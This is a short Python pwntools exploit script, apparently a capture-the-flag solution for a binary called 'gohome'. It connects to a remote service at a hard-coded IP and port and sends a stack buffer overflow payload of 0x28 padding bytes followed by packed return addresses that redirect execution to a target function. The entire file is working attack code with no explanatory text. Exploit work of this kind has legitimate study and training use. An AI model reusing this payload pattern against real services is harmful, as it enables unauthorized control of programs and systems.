from pwn import *

house = 0x4006c6 

r = remote('140.110.112.77', 6126)
#r = process('gohome')
r.recvuntil('house')
raw_input('debug')
r.sendline('a' * 0x28 + p64(0x40074b) + p64(house))
print(r.recvall(1))
#r.interactive()
